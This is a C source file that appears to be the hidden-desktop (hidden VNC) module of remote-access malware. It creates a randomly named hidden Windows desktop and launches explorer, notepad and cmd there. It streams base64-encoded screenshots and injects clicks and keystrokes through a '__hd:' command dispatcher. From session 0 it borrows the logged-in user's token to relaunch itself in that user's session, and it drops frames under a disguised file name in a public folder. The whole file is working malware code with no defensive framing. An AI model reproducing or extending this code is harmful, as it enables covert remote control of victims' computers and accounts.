#include <windows.h>
#include <wtsapi32.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static HDESK g_hd;
static int g_is_host;
static wchar_t g_name[12];
static wchar_t g_winsta[32];
static HANDLE g_to_child = INVALID_HANDLE_VALUE;
static HANDLE g_from_child = INVALID_HANDLE_VALUE;

static char *dupstr(const char *s) {
    size_t n = strlen(s);
    char *o = (char *)malloc(n + 1);
    if (o) memcpy(o, s, n + 1);
    return o;
}

static char *b64(const unsigned char *data, size_t len) {
    static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t out_len = 4 * ((len + 2) / 3);
    char *out = (char *)malloc(out_len + 1);
    size_t i, j = 0;
    if (!out) return NULL;
    for (i = 0; i < len; i += 3) {
        unsigned n = data[i] << 16;
        if (i + 1 < len) n |= data[i + 1] << 8;
        if (i + 2 < len) n |= data[i + 2];
        out[j++] = t[(n >> 18) & 63];
        out[j++] = t[(n >> 12) & 63];
        out[j++] = (i + 1 < len) ? t[(n >> 6) & 63] : '=';
        out[j++] = (i + 2 < len) ? t[n & 63] : '=';
    }
    out[j] = 0;
    return out;
}

static void desk_name(void) {
    unsigned s;
    int i;
    if (g_name[0]) return;
    s = GetCurrentProcessId() ^ GetTickCount();
    g_name[0] = (wchar_t)(L'a' + (s % 26));
    for (i = 1; i < 8; i++) {
        s = s * 1664525u + 1013904223u;
        g_name[i] = L"abcdefghijklmnopqrstuvwxyz0123456789"[s % 36];
    }
    g_name[8] = 0;
    lstrcpyW(g_winsta, L"WinSta0\\");
    lstrcatW(g_winsta, g_name);
}

static int ensure(void) {
    if (g_hd) return 1;
    desk_name();
    g_hd = CreateDesktopW(g_name, NULL, NULL, 0, 0x10000000, NULL);
    if (!g_hd) g_hd = OpenDesktopW(g_name, 0, FALSE, 0x02000000);
    if (!g_hd) g_hd = OpenDesktopW(g_name, 0, FALSE, 0x10000000);
    return g_hd != NULL;
}

static int g_desk_set;

static char *on_desktop(char *(*fn)(void *), void *arg) {
    if (!ensure()) {
        char buf[64];
        snprintf(buf, sizeof(buf), "desktop open failed %lu", GetLastError());
        return dupstr(buf);
    }
    if (!g_desk_set) {
        if (!SetThreadDesktop(g_hd)) return dupstr("set desktop failed");
        g_desk_set = 1;
    }
    return fn(arg);
}

static void frame_path(char *out, size_t n) {
    DWORD serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    snprintf(out, n, "C:\\Users\\Public\\%08lx.hd", (unsigned long)(serial ^ 0xA73C915Eu));
}

static char *do_frame(void *arg);
static BOOL CALLBACK count_wins(HWND hwnd, LPARAM lp);
static HWND g_wins[32];
static int g_nwin;
static BOOL CALLBACK collect_win(HWND hwnd, LPARAM lp);

static DWORD spawn_on_desk(const wchar_t *exe, wchar_t *cmd) {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t desktop[40];
    desk_name();
    lstrcpyW(desktop, g_winsta);
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.lpDesktop = desktop;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWMAXIMIZED;
    if (!CreateProcessW(exe, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) return 0;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return pi.dwProcessId;
}

static int g_started;
static HWND g_focus;

static char *do_start(void *arg) {
    const wchar_t *exe = L"C:\\Windows\\explorer.exe";
    wchar_t cmd[512];
    DWORD pid;
    char buf[96];
    DWORD sid = 0;
    int wins = 0;
    (void)arg;
    if (g_started) return dupstr("desktop already started");
    lstrcpyW(cmd, L"C:\\Windows\\explorer.exe");
    pid = spawn_on_desk(exe, cmd);
    exe = L"C:\\Windows\\System32\\notepad.exe";
    lstrcpyW(cmd, L"C:\\Windows\\System32\\notepad.exe");
    if (!pid) pid = spawn_on_desk(exe, cmd);
    else spawn_on_desk(exe, cmd);
    exe = L"C:\\Windows\\System32\\cmd.exe";
    lstrcpyW(cmd, L"C:\\Windows\\System32\\cmd.exe");
    spawn_on_desk(exe, cmd);
    if (!pid) {
        snprintf(buf, sizeof(buf), "spawn failed %lu", GetLastError());
        return dupstr(buf);
    }
    g_started = 1;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    g_nwin = 0;
    EnumWindows(collect_win, 0);
    wins = g_nwin;
    snprintf(buf, sizeof(buf), "desktop started pid=%lu session=%lu windows=%d", pid, sid, wins);
    {
        int i;
        for (i = 0; i < g_nwin && i < 3; i++) {
            char cls[24];
            GetClassNameA(g_wins[i], cls, 24);
            strncat(buf, " ", sizeof(buf) - strlen(buf) - 1);
            strncat(buf, cls, sizeof(buf) - strlen(buf) - 1);
        }
    }
    return dupstr(buf);
}

static int g_scr_w = 1280, g_scr_h = 800, g_cap_w = 960, g_cap_h = 540;
static CRITICAL_SECTION g_hd_lock;
static int g_lock_ready;

static void hd_lock(void) {
    if (!g_lock_ready) {
        InitializeCriticalSection(&g_hd_lock);
        g_lock_ready = 1;
    }
    EnterCriticalSection(&g_hd_lock);
}

static void hd_unlock(void) {
    LeaveCriticalSection(&g_hd_lock);
}

static void write_frame_file(const char *img) {
    char path[64];
    FILE *fp;
    if (!img || strncmp(img, "HDIMG:", 6) != 0) return;
    frame_path(path, sizeof(path));
    fp = fopen(path, "wb");
    if (fp) { fputs(img, fp); fclose(fp); }
}

static BOOL CALLBACK count_wins(HWND hwnd, LPARAM lp) {
    if (IsWindowVisible(hwnd)) (*(int *)lp)++;
    return TRUE;
}

static void paint_one(HWND hwnd, HDC dst) {
    RECT rc;
    HDC src, tmp;
    HBITMAP bits, old;
    int ww, wh, x, y, dw, dh;
    if (!IsWindowVisible(hwnd) || IsIconic(hwnd) || hwnd == GetDesktopWindow()) return;
    if (!GetWindowRect(hwnd, &rc)) return;
    ww = rc.right - rc.left;
    wh = rc.bottom - rc.top;
    if (ww < 8 || wh < 8 || g_scr_w < 1 || g_scr_h < 1) return;
    src = GetWindowDC(hwnd);
    if (!src) return;
    tmp = CreateCompatibleDC(src);
    bits = CreateCompatibleBitmap(src, ww, wh);
    old = SelectObject(tmp, bits);
    if (!PrintWindow(hwnd, tmp, 2)) BitBlt(tmp, 0, 0, ww, wh, src, 0, 0, SRCCOPY);
    x = rc.left * g_cap_w / g_scr_w;
    y = rc.top * g_cap_h / g_scr_h;
    dw = ww * g_cap_w / g_scr_w;
    dh = wh * g_cap_h / g_scr_h;
    if (dw > 0 && dh > 0) StretchBlt(dst, x, y, dw, dh, tmp, 0, 0, ww, wh, SRCCOPY);
    SelectObject(tmp, old);
    DeleteObject(bits);
    DeleteDC(tmp);
    ReleaseDC(hwnd, src);
}

static BOOL CALLBACK collect_win(HWND hwnd, LPARAM lp) {
    (void)lp;
    if (g_nwin < 32 && IsWindowVisible(hwnd)) {
        char cls[32];
        GetClassNameA(hwnd, cls, 32);
        if (strcmp(cls, "Progman") == 0 || strcmp(cls, "WorkerW") == 0) return TRUE;
        g_wins[g_nwin++] = hwnd;
    }
    return TRUE;
}

static char *do_frame(void *arg) {
    (void)arg;
    int sw, sh, dw, dh, stride;
    HDC hdc, mem;
    HBITMAP bmp, old;
    BITMAPINFO bi;
    unsigned char *pixels, *file;
    char *encoded, *out;
    size_t flen;
    sw = GetSystemMetrics(SM_CXSCREEN);
    sh = GetSystemMetrics(SM_CYSCREEN);
    if (sw < 320) sw = 1280;
    if (sh < 200) sh = 800;
    dw = sw > 1280 ? 1280 : sw;
    dh = sh * dw / sw;
    if (dh < 1) dh = 1;
    g_scr_w = sw;
    g_scr_h = sh;
    g_cap_w = dw;
    g_cap_h = dh;
    hdc = GetDC(NULL);
    if (!hdc) return dupstr("no desktop dc");
    mem = CreateCompatibleDC(hdc);
    bmp = CreateCompatibleBitmap(hdc, dw, dh);
    old = SelectObject(mem, bmp);
    SetStretchBltMode(mem, COLORONCOLOR);
    {
        RECT box = {0, 0, dw, dh};
        HBRUSH br = CreateSolidBrush(RGB(20, 40, 70));
        FillRect(mem, &box, br);
        DeleteObject(br);
    }
    g_nwin = 0;
    EnumWindows(collect_win, 0);
    {
        int i;
        for (i = g_nwin - 1; i >= 0; i--) paint_one(g_wins[i], mem);
    }
    SelectObject(mem, old);
    ZeroMemory(&bi, sizeof(bi));
    bi.bmiHeader.biSize = 40;
    bi.bmiHeader.biWidth = dw;
    bi.bmiHeader.biHeight = -dh;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
    stride = ((dw * 3 + 3) / 4) * 4;
    pixels = (unsigned char *)calloc(1, stride * (size_t)dh);
    GetDIBits(mem, bmp, 0, dh, pixels, &bi, DIB_RGB_COLORS);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, hdc);
    flen = 54 + stride * (size_t)dh;
    file = (unsigned char *)calloc(1, flen);
    memcpy(file, "BM", 2);
    *(uint32_t *)(file + 2) = (uint32_t)flen;
    *(uint32_t *)(file + 10) = 54;
    *(uint32_t *)(file + 14) = 40;
    *(int32_t *)(file + 18) = dw;
    *(int32_t *)(file + 22) = -dh;
    *(uint16_t *)(file + 26) = 1;
    *(uint16_t *)(file + 28) = 24;
    memcpy(file + 54, pixels, stride * (size_t)dh);
    {
        unsigned char *jpg = NULL;
        size_t jlen = 0;
        unsigned char *hd_jpeg(const unsigned char *bgr, int w, int h, int stride, int quality, size_t *out_len);
        jpg = hd_jpeg(pixels, dw, dh, stride, 60, &jlen);
        free(pixels);
        pixels = NULL;
        if (jpg && jlen > 32 && jlen < 900000) {
            encoded = b64(jpg, jlen);
            free(jpg);
            free(file);
            if (!encoded) return dupstr("frame encode failed");
            out = (char *)malloc(32 + strlen(encoded));
            sprintf(out, "HDIMG:%d,%d:%s", dw, dh, encoded);
            free(encoded);
            write_frame_file(out);
            return out;
        }
        free(jpg);
    }
    encoded = b64(file, flen);
    free(file);
    if (!encoded) return dupstr("frame encode failed");
    out = (char *)malloc(32 + strlen(encoded));
    sprintf(out, "HDIMG:%d,%d:%s", dw, dh, encoded);
    free(encoded);
    write_frame_file(out);
    return out;
}

struct frame_job { char *result; HANDLE done; };
static DWORD WINAPI frame_worker(LPVOID p) {
    struct frame_job *j = p;
    j->result = on_desktop(do_frame, NULL);
    SetEvent(j->done);
    return 0;
}

static char *do_click(void *arg) {
    int x = 0, y = 0, right = 0;
    int sw, sh;
    char *s = (char *)arg;
    if (!s || sscanf(s, "%d %d %d", &x, &y, &right) < 2) return dupstr("click needs x y");
    sw = g_scr_w > 0 ? g_scr_w : GetSystemMetrics(SM_CXSCREEN);
    sh = g_scr_h > 0 ? g_scr_h : GetSystemMetrics(SM_CYSCREEN);
    if (sw <= 0) sw = 1024;
    if (sh <= 0) sh = 768;
    if (g_cap_w > 0 && g_cap_w != sw) x = x * sw / g_cap_w;
    if (g_cap_h > 0 && g_cap_h != sh) y = y * sh / g_cap_h;
    {
        POINT pt;
        HWND hwnd;
        LPARAM lp;
        DWORD tid, me;
        char cls[32], buf[80];
        pt.x = x;
        pt.y = y;
        hwnd = WindowFromPoint(pt);
        if (!hwnd) return dupstr("click missed");
        g_focus = hwnd;
        tid = GetWindowThreadProcessId(hwnd, NULL);
        me = GetCurrentThreadId();
        if (tid && tid != me) {
            AttachThreadInput(me, tid, TRUE);
            SetFocus(hwnd);
            AttachThreadInput(me, tid, FALSE);
        }
        ScreenToClient(hwnd, &pt);
        lp = MAKELPARAM(pt.x, pt.y);
        if (right) {
            PostMessage(hwnd, WM_RBUTTONDOWN, MK_RBUTTON, lp);
            PostMessage(hwnd, WM_RBUTTONUP, 0, lp);
        } else {
            PostMessage(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lp);
            PostMessage(hwnd, WM_LBUTTONUP, 0, lp);
        }
        GetClassNameA(hwnd, cls, 32);
        snprintf(buf, sizeof(buf), "click %d %d %s", x, y, cls);
        return dupstr(buf);
    }
}

static char *do_type(void *arg) {
    const char *text = arg ? (const char *)arg : "";
    int n = 0;
    for (; *text; text++, n++) {
        wchar_t w;
        SHORT pair;
        BYTE vk;
        MultiByteToWideChar(CP_UTF8, 0, text, 1, &w, 1);
        if (!g_focus) g_focus = GetForegroundWindow();
        if (!g_focus) continue;
        if (*text == '\n' || *text == '\r') {
            PostMessage(g_focus, WM_KEYDOWN, VK_RETURN, 0);
            PostMessage(g_focus, WM_CHAR, '\r', 1);
            PostMessage(g_focus, WM_KEYUP, VK_RETURN, 0);
            continue;
        }
        PostMessage(g_focus, WM_CHAR, (WPARAM)w, 1);
        (void)pair;
        (void)vk;
    }
    {
        char buf[32];
        snprintf(buf, sizeof(buf), "typed %d", n);
        return dupstr(buf);
    }
}

static char *do_key(void *arg) {
    int vk = arg ? atoi((const char *)arg) : 13;
    if (vk <= 0) vk = 13;
    if (!g_focus) g_focus = GetForegroundWindow();
    if (g_focus) {
        PostMessage(g_focus, WM_KEYDOWN, vk, 0);
        if (vk == VK_RETURN) PostMessage(g_focus, WM_CHAR, '\r', 1);
        if (vk == VK_BACK) PostMessage(g_focus, WM_CHAR, 8, 1);
        PostMessage(g_focus, WM_KEYUP, vk, 0);
    }
    {
        char buf[32];
        snprintf(buf, sizeof(buf), "key %d", vk);
        return dupstr(buf);
    }
}

static int session_id(void) {
    DWORD sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    return (int)sid;
}

static DWORD pick_session(void) {
    DWORD console = WTSGetActiveConsoleSessionId();
    PWTS_SESSION_INFOA info = NULL;
    DWORD count = 0, i, chosen = 0xFFFFFFFF;
    HANDLE tok = NULL;
    if (console != 0 && console != 0xFFFFFFFF && WTSQueryUserToken(console, &tok)) {
        CloseHandle(tok);
        return console;
    }
    if (!WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &info, &count)) return 0xFFFFFFFF;
    for (i = 0; i < count; i++) {
        if (info[i].SessionId == 0 || info[i].State != WTSActive) continue;
        if (WTSQueryUserToken(info[i].SessionId, &tok)) {
            chosen = info[i].SessionId;
            CloseHandle(tok);
            break;
        }
    }
    WTSFreeMemory(info);
    return chosen;
}

static int write_all(HANDLE h, const void *buf, DWORD n) {
    const char *p = buf;
    while (n) {
        DWORD w = 0;
        if (!WriteFile(h, p, n, &w, NULL) || !w) return 0;
        p += w;
        n -= w;
    }
    return 1;
}

static int read_all(HANDLE h, void *buf, DWORD n) {
    char *p = buf;
    while (n) {
        DWORD r = 0;
        if (!ReadFile(h, p, n, &r, NULL) || !r) return 0;
        p += r;
        n -= r;
    }
    return 1;
}

static int read_timeout(HANDLE h, void *buf, DWORD n, int ms) {
    char *p = buf;
    int waited = 0;
    while (n) {
        DWORD avail = 0, r = 0;
        if (!PeekNamedPipe(h, NULL, 0, NULL, &avail, NULL)) return 0;
        if (!avail) {
            if (waited >= ms) return 0;
            Sleep(50);
            waited += 50;
            continue;
        }
        if (avail > n) avail = n;
        if (!ReadFile(h, p, avail, &r, NULL) || !r) return 0;
        p += r;
        n -= r;
    }
    return 1;
}

static int launch_host(void) {
    DWORD sid = pick_session();
    HANDLE tok = NULL, dup = NULL;
    HANDLE cr = NULL, cw = NULL, rr = NULL, rw = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char exe[1024], cmd[1100];
    unsigned char mag[4] = {0xA7, 0x3C, 0x91, 0x5E};
    DWORD wrote = 0;
    if (sid == 0xFFFFFFFF || !WTSQueryUserToken(sid, &tok)) return 0;
    if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dup)) {
        CloseHandle(tok);
        return 0;
    }
    CloseHandle(tok);
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&cr, &cw, &sa, 0) || !CreatePipe(&rr, &rw, &sa, 0)) {
        CloseHandle(dup);
        return 0;
    }
    SetHandleInformation(cw, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(rr, HANDLE_FLAG_INHERIT, 0);
    WriteFile(cw, mag, 4, &wrote, NULL);
    GetModuleFileNameA(NULL, exe, MAX_PATH);
    snprintf(cmd, sizeof(cmd), "\"%s\"", exe);
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.lpDesktop = "winsta0\\default";
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = cr;
    si.hStdOutput = rw;
    si.hStdError = rw;
    if (!CreateProcessAsUserA(dup, NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(dup);
            CloseHandle(cr); CloseHandle(cw); CloseHandle(rr); CloseHandle(rw);
            return 0;
        }
    }
    CloseHandle(dup);
    CloseHandle(cr);
    CloseHandle(rw);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    g_to_child = cw;
    g_from_child = rr;
    return 1;
}

struct pipe_read {
    HANDLE h;
    char *buf;
    DWORD n;
    int ok;
    HANDLE done;
};

static DWORD WINAPI pipe_read_worker(LPVOID p) {
    struct pipe_read *j = p;
    j->ok = read_all(j->h, j->buf, j->n);
    SetEvent(j->done);
    return 0;
}

static int read_wait(HANDLE h, void *buf, DWORD n) {
    struct pipe_read j;
    HANDLE th;
    j.h = h;
    j.buf = buf;
    j.n = n;
    j.ok = 0;
    j.done = CreateEventA(NULL, TRUE, FALSE, NULL);
    th = CreateThread(NULL, 0, pipe_read_worker, &j, 0, NULL);
    if (!th || WaitForSingleObject(j.done, 8000) != WAIT_OBJECT_0) {
        if (th) CloseHandle(th);
        CloseHandle(j.done);
        return 0;
    }
    CloseHandle(th);
    CloseHandle(j.done);
    return j.ok;
}

static char *via_host(const char *cmd) {
    DWORD n = (DWORD)strlen(cmd);
    char *out = NULL;
    if (g_to_child == INVALID_HANDLE_VALUE || g_from_child == INVALID_HANDLE_VALUE) {
        if (!launch_host()) {
            char buf[64];
            snprintf(buf, sizeof(buf), "desktop host failed %lu", GetLastError());
            return dupstr(buf);
        }
    }
    if (write_all(g_to_child, &n, 4) && write_all(g_to_child, cmd, n) && read_wait(g_from_child, &n, 4) && n > 0 && n < 2 * 1024 * 1024) {
        out = (char *)malloc(n + 1);
        if (out && read_wait(g_from_child, out, n)) out[n] = 0;
        else { free(out); out = NULL; }
    }
    if (!out) {
        CloseHandle(g_to_child);
        CloseHandle(g_from_child);
        g_to_child = g_from_child = INVALID_HANDLE_VALUE;
        return dupstr("desktop host io failed");
    }
    return out;
}

char *hidden_desktop(const char *cmd);

int hd_take_host(void) {
    HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
    unsigned char mag[4], expect[4] = {0xA7, 0x3C, 0x91, 0x5E};
    DWORD got = 0;
    if (!in || in == INVALID_HANDLE_VALUE || GetFileType(in) != FILE_TYPE_PIPE) return 0;
    if (!PeekNamedPipe(in, mag, 4, &got, NULL, NULL) || got < 4 || memcmp(mag, expect, 4) != 0) return 0;
    ReadFile(in, mag, 4, &got, NULL);
    return 1;
}

static DWORD WINAPI refresh_worker(LPVOID p) {
    (void)p;
    for (;;) {
        char *img;
        hd_lock();
        img = on_desktop(do_frame, NULL);
        hd_unlock();
        free(img);
        Sleep(800);
    }
    return 0;
}

int hd_host_main(void) {
    HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
    g_is_host = 1;
    hd_lock();
    if (!ensure()) { hd_unlock(); return 1; }
    free(on_desktop(do_start, NULL));
    hd_unlock();
    CreateThread(NULL, 0, refresh_worker, NULL, 0, NULL);
    for (;;) {
        DWORD n = 0;
        char *cmd, *resp;
        if (!read_all(in, &n, 4) || n > 4096) return 0;
        cmd = (char *)malloc(n + 1);
        if (!cmd || !read_all(in, cmd, n)) return 0;
        cmd[n] = 0;
        resp = hidden_desktop(cmd);
        free(cmd);
        n = (DWORD)strlen(resp);
        write_all(out, &n, 4);
        write_all(out, resp, n);
        free(resp);
    }
}

char *hidden_desktop(const char *cmd) {
    const char *rest, *sp, *action, *arg;
    char act[32];
    if (!cmd || strncmp(cmd, "__hd:", 5) != 0) return dupstr("unknown desktop action");
    if (!g_is_host && session_id() == 0 && strncmp(cmd, "__hd:frame", 10) == 0) {
        char path[64];
        frame_path(path, sizeof(path));
        FILE *fp = fopen(path, "rb");
        char *buf;
        long n;
        if (!fp) return dupstr("no frame yet");
        fseek(fp, 0, SEEK_END);
        n = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        if (n <= 0 || n > 4 * 1024 * 1024) { fclose(fp); return dupstr("bad frame"); }
        buf = (char *)malloc((size_t)n + 1);
        if (!buf || fread(buf, 1, (size_t)n, fp) != (size_t)n) { free(buf); fclose(fp); return dupstr("bad frame"); }
        fclose(fp);
        DeleteFileA(path);
        buf[n] = 0;
        return buf;
    }
    if (!g_is_host && session_id() == 0) return via_host(cmd);
    hd_lock();
    rest = cmd + 5;
    while (*rest == ' ') rest++;
    sp = strchr(rest, ' ');
    if (!sp) { action = rest; arg = ""; }
    else {
        size_t n = (size_t)(sp - rest);
        if (n > 31) n = 31;
        memcpy(act, rest, n);
        act[n] = 0;
        action = act;
        arg = sp + 1;
    }
    {
        char *out;
        if (action[0] == 0 || strcmp(action, "start") == 0) out = on_desktop(do_start, (void *)arg);
        else if (strcmp(action, "frame") == 0) out = on_desktop(do_frame, NULL);
        else if (strcmp(action, "click") == 0) out = on_desktop(do_click, (void *)arg);
        else if (strcmp(action, "rclick") == 0) {
            char buf[128];
            snprintf(buf, sizeof(buf), "%s 1", arg);
            out = on_desktop(do_click, buf);
        } else if (strcmp(action, "type") == 0) out = on_desktop(do_type, (void *)arg);
        else if (strcmp(action, "key") == 0) out = on_desktop(do_key, (void *)arg);
        else if (strcmp(action, "stop") == 0) {
            if (g_hd) { CloseDesktop(g_hd); g_hd = NULL; }
            out = dupstr("desktop stopped");
        } else out = dupstr("unknown desktop action");
        hd_unlock();
        return out;
    }
}
